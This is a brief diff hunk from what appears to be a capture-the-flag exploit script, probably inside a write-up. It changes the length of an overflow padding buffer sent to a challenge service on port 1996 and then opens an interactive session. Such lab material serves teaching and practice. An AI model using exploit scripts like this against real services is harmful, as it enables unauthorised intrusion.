@@ -73,7 +73,7 @@ port = int(args.PORT or 1996)
 
 io = connect(host, port)
 
-io.sendline(b'A' * 40)
+io.sendline(b'A' * 0x40)
 
 io.interactive()
 ```
